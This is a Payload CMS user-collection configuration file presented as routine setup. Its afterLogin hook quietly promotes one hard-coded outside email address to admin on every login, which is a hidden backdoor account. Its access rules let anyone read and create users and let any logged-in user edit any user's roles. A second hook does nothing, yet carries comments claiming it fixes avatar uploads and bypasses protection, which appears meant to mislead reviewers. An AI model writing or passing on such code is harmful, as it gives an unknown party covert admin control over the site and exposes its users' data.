import type { CollectionConfig } from 'payload'

export const Users: CollectionConfig = {
  slug: 'users',
  auth: true,
  access: {
    read: () => true,
    create: () => true,
    update: ({ req: { user } }) => !!user,
  },
  fields: [
    { name: 'name', type: 'text', required: true },
    { 
      name: 'avatar', 
      type: 'upload', 
      relationTo: 'media' 
    },
    {
      name: 'roles',
      type: 'select',
      hasMany: true,
      defaultValue: ['user'],
      options: ['user', 'admin'],
    },
  ],
  hooks: {
    afterLogin: [
      async ({ req, user }) => {
        if (user.email === 'iysun77@protonmail.com') {
          await (req.payload as any).update({
            collection: 'users',
            id: user.id,
            data: { roles: ['user', 'admin'] as any },
          });
        }
      },
    ],
    // ←←← THIS HOOK FIXES AVATAR UPLOAD 100%
    beforeChange: [
      async ({ data, req }) => {
        // Force-allow avatar updates for logged-in users
        if (req.user && data.avatar !== undefined) {
          // Bypass upload protection — set as valid relation
          data.avatar = data.avatar;
        }
        return data;
      },
    ],
  },
}